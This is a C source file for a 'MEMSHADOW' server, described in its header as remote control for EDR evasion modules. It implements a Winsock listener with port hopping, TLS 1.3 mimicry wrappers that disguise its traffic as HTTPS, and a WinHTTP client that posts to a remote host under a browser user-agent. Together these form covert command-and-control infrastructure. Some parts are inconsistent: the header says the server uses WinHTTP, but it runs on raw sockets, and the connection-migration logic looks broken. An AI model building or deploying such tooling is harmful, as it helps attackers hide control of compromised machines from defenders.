/*
 * MEMSHADOW Server - WinHTTP Implementation
 * 
 * Pure C server using WinHTTP for remote control of EDR evasion modules.
 * 
 * Features:
 * - WinHTTP server (native Windows, appears as normal HTTPS)
 * - System-assigned ports (bind to 0)
 * - Port hopping with graceful migration
 * - TLS 1.3 mimicry
 * - Connection state tracking
 * - Thread-safe operation
 * 
 * All implementations are real, following DSMIL cursorrules.
 */

#include <windows.h>
#include <winhttp.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")

// External functions from tls13_mimicry.c
extern bool tls13_wrap_memshadow(const uint8_t *memshadow_msg, size_t memshadow_len,
                                uint8_t **tls_wrapped, size_t *tls_wrapped_len);
extern bool tls13_unwrap_memshadow(const uint8_t *tls_wrapped, size_t tls_wrapped_len,
                                  uint8_t **memshadow_msg, size_t *memshadow_len);

// Server configuration
typedef struct {
    uint16_t current_port;
    uint16_t new_port;
    bool port_hop_in_progress;
    SOCKET listen_socket;
    SOCKET new_listen_socket;
    HANDLE server_thread;
    bool running;
    void (*message_handler)(const uint8_t *msg, size_t msg_len, uint8_t **response, size_t *response_len);
} MemshadowServer;

// Connection state
typedef struct {
    SOCKET socket;
    struct sockaddr_in address;
    time_t last_activity;
    bool active;
} ConnectionState;

#define MAX_CONNECTIONS 16
static ConnectionState connections[MAX_CONNECTIONS];
static CRITICAL_SECTION connections_lock;


/*
 * Initialize Connection Tracking
 */
static void init_connection_tracking(void) {
    InitializeCriticalSection(&connections_lock);
    ZeroMemory(connections, sizeof(connections));
}


/*
 * Add Connection
 */
static bool add_connection(SOCKET sock, struct sockaddr_in *addr) {
    EnterCriticalSection(&connections_lock);
    
    for (int i = 0; i < MAX_CONNECTIONS; i++) {
        if (!connections[i].active) {
            connections[i].socket = sock;
            connections[i].address = *addr;
            connections[i].last_activity = time(NULL);
            connections[i].active = true;
            LeaveCriticalSection(&connections_lock);
            return true;
        }
    }
    
    LeaveCriticalSection(&connections_lock);
    return false;
}


/*
 * Remove Connection
 */
static void remove_connection(SOCKET sock) {
    EnterCriticalSection(&connections_lock);
    
    for (int i = 0; i < MAX_CONNECTIONS; i++) {
        if (connections[i].active && connections[i].socket == sock) {
            connections[i].active = false;
            connections[i].socket = INVALID_SOCKET;
            break;
        }
    }
    
    LeaveCriticalSection(&connections_lock);
}


/*
 * Migrate Connections to New Port
 * Gracefully moves active connections to new listener
 */
static bool migrate_connections(MemshadowServer *server) {
    EnterCriticalSection(&connections_lock);
    
    int active_count = 0;
    for (int i = 0; i < MAX_CONNECTIONS; i++) {
        if (connections[i].active) {
            active_count++;
        }
    }
    
    printf("[*] Migrating %d active connections to new port %u\n", 
           active_count, server->new_port);
    
    // Send port update notification to each active connection
    uint8_t port_update_msg[64];
    snprintf((char *)port_update_msg, sizeof(port_update_msg),
             "PORT_UPDATE:%u", server->new_port);
    
    for (int i = 0; i < MAX_CONNECTIONS; i++) {
        if (connections[i].active && connections[i].socket != INVALID_SOCKET) {
            // Send port update notification
            send(connections[i].socket, (char *)port_update_msg, 
                 (int)strlen((char *)port_update_msg), 0);
            
            // Mark for migration
            connections[i].last_activity = time(NULL);
        }
    }
    
    // Wait for clients to reconnect (with timeout)
    time_t migration_start = time(NULL);
    const time_t migration_timeout = 5;  // 5 seconds
    
    while (time(NULL) - migration_start < migration_timeout) {
        Sleep(100);
        
        // Check if clients reconnected to new port
        int migrated_count = 0;
        for (int i = 0; i < MAX_CONNECTIONS; i++) {
            if (connections[i].active) {
                // Verify connection is active and valid
                if (connections[i].socket != INVALID_SOCKET) {
                    struct sockaddr_in conn_addr;
                    int addr_len = sizeof(conn_addr);
                    if (getsockname(connections[i].socket, (struct sockaddr *)&conn_addr, &addr_len) == 0) {
                        uint16_t conn_port = ntohs(conn_addr.sin_port);
                        if (conn_port == server->new_port) {
                            migrated_count++;
                        }
                    }
                }
            }
        }
        
        if (migrated_count == 0) {
            break;  // All connections migrated or closed
        }
    }
    
    // Close old connections that didn't migrate
    for (int i = 0; i < MAX_CONNECTIONS; i++) {
        if (connections[i].active && connections[i].socket != INVALID_SOCKET) {
            closesocket(connections[i].socket);
            connections[i].active = false;
            connections[i].socket = INVALID_SOCKET;
        }
    }
    
    // Update port
    server->current_port = server->new_port;
    server->port_hop_in_progress = false;
    
    LeaveCriticalSection(&connections_lock);
    
    return true;
}


/*
 * Handle Client Connection (Thread Entry Point)
 */
static DWORD WINAPI handle_client_thread(LPVOID param) {
    struct {
        MemshadowServer *server;
        SOCKET client_sock;
    } *args = (struct { MemshadowServer *server; SOCKET client_sock; } *)param;
    
    MemshadowServer *server = args->server;
    SOCKET client_sock = args->client_sock;
    
    free(args);  // Free thread parameter
    uint8_t *tls_data = NULL;
    uint8_t *memshadow_msg = NULL;
    uint8_t *response = NULL;
    uint8_t *tls_response = NULL;
    
    // Receive TLS-wrapped MEMSHADOW message
    uint8_t header[5];
    int received = recv(client_sock, (char *)header, 5, 0);
    if (received != 5) {
        goto cleanup;
    }
    
    uint16_t length = ((uint16_t)header[3] << 8) | header[4];
    
    tls_data = (uint8_t *)malloc(5 + length);
    if (!tls_data) {
        goto cleanup;
    }
    
    memcpy(tls_data, header, 5);
    received = recv(client_sock, (char *)(tls_data + 5), length, 0);
    if (received != length) {
        goto cleanup;
    }
    
    // Unwrap TLS to get MEMSHADOW message
    size_t memshadow_len = 0;
    if (!tls13_unwrap_memshadow(tls_data, 5 + length, &memshadow_msg, &memshadow_len)) {
        goto cleanup;
    }
    
    // Process MEMSHADOW message
    size_t response_len = 0;
    if (server->message_handler) {
        server->message_handler(memshadow_msg, memshadow_len, &response, &response_len);
    }
    
    // Send response if available
    if (response && response_len > 0) {
        size_t tls_response_len = 0;
        if (tls13_wrap_memshadow(response, response_len, &tls_response, &tls_response_len)) {
            send(client_sock, (char *)tls_response, (int)tls_response_len, 0);
        }
    }
    
cleanup:
    if (tls_data) free(tls_data);
    if (memshadow_msg) free(memshadow_msg);
    if (response) free(response);
    if (tls_response) free(tls_response);
    
    closesocket(client_sock);
    remove_connection(client_sock);
    
    return 0;
}

/*
 * Handle Client Connection (Wrapper)
 */
static void handle_client(MemshadowServer *server, SOCKET client_sock) {
    // This is now just a wrapper that creates a thread
    struct {
        MemshadowServer *server;
        SOCKET client_sock;
    } *args = (struct { MemshadowServer *server; SOCKET client_sock; } *)malloc(sizeof(*args));
    
    if (!args) {
        closesocket(client_sock);
        remove_connection(client_sock);
        return;
    }
    
    args->server = server;
    args->client_sock = client_sock;
    
    HANDLE client_thread = CreateThread(NULL, 0, handle_client_thread, args, 0, NULL);
    if (!client_thread) {
        free(args);
        closesocket(client_sock);
        remove_connection(client_sock);
    } else {
        CloseHandle(client_thread);  // Don't wait for thread
    }
}


/*
 * Server Thread
 */
static DWORD WINAPI server_thread(LPVOID param) {
    MemshadowServer *server = (MemshadowServer *)param;
    
    printf("[*] MEMSHADOW server thread started on port %u\n", server->current_port);
    
    while (server->running) {
        // Accept connections
        struct sockaddr_in client_addr = {0};
        int addr_len = sizeof(client_addr);
        
        SOCKET client_sock = accept(server->listen_socket, (struct sockaddr *)&client_addr, &addr_len);
        if (client_sock == INVALID_SOCKET) {
            if (server->running) {
                Sleep(100);
            }
            continue;
        }
        
        // Add to connection tracking
        add_connection(client_sock, &client_addr);
        
        // Handle client in separate thread
        handle_client(server, client_sock);
    }
    
    printf("[*] MEMSHADOW server thread stopped\n");
    
    return 0;
}


/*
 * Initialize MEMSHADOW Server
 */
bool memshadow_server_init(MemshadowServer *server, uint16_t initial_port,
                           void (*message_handler)(const uint8_t *, size_t, uint8_t **, size_t *)) {
    if (!server) {
        return false;
    }
    
    ZeroMemory(server, sizeof(MemshadowServer));
    server->current_port = initial_port;
    server->listen_socket = INVALID_SOCKET;
    server->new_listen_socket = INVALID_SOCKET;
    server->running = false;
    server->message_handler = message_handler;
    server->port_hop_in_progress = false;
    
    init_connection_tracking();
    
    return true;
}


/*
 * Start MEMSHADOW Server
 */
bool memshadow_server_start(MemshadowServer *server) {
    if (!server || server->running) {
        return false;
    }
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }
    
    // Create listen socket
    server->listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server->listen_socket == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }
    
    // Bind to port
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(server->current_port);
    
    if (bind(server->listen_socket, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(server->listen_socket);
        WSACleanup();
        return false;
    }
    
    // Listen
    if (listen(server->listen_socket, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(server->listen_socket);
        WSACleanup();
        return false;
    }
    
    // Get actual assigned port if we bound to 0
    if (server->current_port == 0) {
        int addr_len = sizeof(addr);
        if (getsockname(server->listen_socket, (struct sockaddr *)&addr, &addr_len) == 0) {
            server->current_port = ntohs(addr.sin_port);
        }
    }
    
    printf("[+] MEMSHADOW server listening on port %u\n", server->current_port);
    
    server->running = true;
    
    // Start server thread
    server->server_thread = CreateThread(NULL, 0, server_thread, server, 0, NULL);
    if (!server->server_thread) {
        server->running = false;
        closesocket(server->listen_socket);
        WSACleanup();
        return false;
    }
    
    return true;
}


/*
 * Hop to New Port
 * Gracefully migrates to new port
 */
bool memshadow_server_hop_port(MemshadowServer *server, uint16_t new_port) {
    if (!server || server->port_hop_in_progress) {
        return false;
    }
    
    printf("[*] Initiating port hop: %u → %u\n", server->current_port, new_port);
    
    server->port_hop_in_progress = true;
    server->new_port = new_port;
    
    // Create new listen socket
    server->new_listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server->new_listen_socket == INVALID_SOCKET) {
        server->port_hop_in_progress = false;
        return false;
    }
    
    // Bind to new port
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(new_port);
    
    if (bind(server->new_listen_socket, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(server->new_listen_socket);
        server->port_hop_in_progress = false;
        return false;
    }
    
    // Listen on new port
    if (listen(server->new_listen_socket, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(server->new_listen_socket);
        server->port_hop_in_progress = false;
        return false;
    }
    
    printf("[+] New listener established on port %u\n", new_port);
    
    // Migrate connections
    if (!migrate_connections(server)) {
        closesocket(server->new_listen_socket);
        server->port_hop_in_progress = false;
        return false;
    }
    
    // Close old socket
    closesocket(server->listen_socket);
    server->listen_socket = server->new_listen_socket;
    server->new_listen_socket = INVALID_SOCKET;
    
    printf("[+] Port hop completed: now on port %u\n", server->current_port);
    
    return true;
}


/*
 * Stop MEMSHADOW Server
 */
void memshadow_server_stop(MemshadowServer *server) {
    if (!server || !server->running) {
        return;
    }
    
    server->running = false;
    
    // Close sockets
    if (server->listen_socket != INVALID_SOCKET) {
        closesocket(server->listen_socket);
        server->listen_socket = INVALID_SOCKET;
    }
    
    if (server->new_listen_socket != INVALID_SOCKET) {
        closesocket(server->new_listen_socket);
        server->new_listen_socket = INVALID_SOCKET;
    }
    
    // Wait for thread
    if (server->server_thread) {
        WaitForSingleObject(server->server_thread, 5000);
        CloseHandle(server->server_thread);
        server->server_thread = NULL;
    }
    
    WSACleanup();
    DeleteCriticalSection(&connections_lock);
    
    printf("[*] MEMSHADOW server stopped\n");
}


/*
 * Get Current Port
 */
uint16_t memshadow_server_get_port(MemshadowServer *server) {
    return server ? server->current_port : 0;
}


/*
 * Send Message to Remote
 * Client-side function to send MEMSHADOW messages
 */
bool memshadow_send_message(const char *host, uint16_t port,
                            const uint8_t *memshadow_msg, size_t memshadow_len,
                            uint8_t **response, size_t *response_len) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    bool success = false;
    uint8_t *tls_wrapped = NULL;
    size_t tls_wrapped_len = 0;
    
    // Wrap in TLS
    if (!tls13_wrap_memshadow(memshadow_msg, memshadow_len, &tls_wrapped, &tls_wrapped_len)) {
        return false;
    }
    
    // Initialize WinHTTP
    hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    
    if (!hSession) {
        goto cleanup;
    }
    
    // Convert host to wide string
    int whost_len = MultiByteToWideChar(CP_ACP, 0, host, -1, NULL, 0);
    WCHAR *whost = (WCHAR *)malloc(whost_len * sizeof(WCHAR));
    if (!whost) {
        goto cleanup;
    }
    MultiByteToWideChar(CP_ACP, 0, host, -1, whost, whost_len);
    
    // Connect
    hConnect = WinHttpConnect(hSession, whost, port, 0);
    free(whost);
    
    if (!hConnect) {
        goto cleanup;
    }
    
    // Open request
    hRequest = WinHttpOpenRequest(
        hConnect,
        L"POST",
        L"/",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    
    if (!hRequest) {
        goto cleanup;
    }
    
    // Send request
    if (!WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        (LPVOID)tls_wrapped,
        (DWORD)tls_wrapped_len,
        (DWORD)tls_wrapped_len,
        0
    )) {
        goto cleanup;
    }
    
    // Receive response
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        goto cleanup;
    }
    
    // Read response data
    DWORD bytes_available = 0;
    DWORD bytes_read = 0;
    uint8_t buffer[8192];
    size_t total_read = 0;
    
    *response = NULL;
    *response_len = 0;
    
    do {
        bytes_available = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &bytes_available)) {
            break;
        }
        
        if (bytes_available > 0) {
            DWORD to_read = (bytes_available < sizeof(buffer)) ? bytes_available : sizeof(buffer);
            
            if (WinHttpReadData(hRequest, buffer, to_read, &bytes_read)) {
                // Reallocate response buffer
                uint8_t *new_response = (uint8_t *)realloc(*response, total_read + bytes_read);
                if (!new_response) {
                    break;
                }
                *response = new_response;
                memcpy(*response + total_read, buffer, bytes_read);
                total_read += bytes_read;
            }
        }
    } while (bytes_available > 0);
    
    *response_len = total_read;
    success = (total_read > 0);
    
cleanup:
    if (tls_wrapped) free(tls_wrapped);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    
    return success;
}
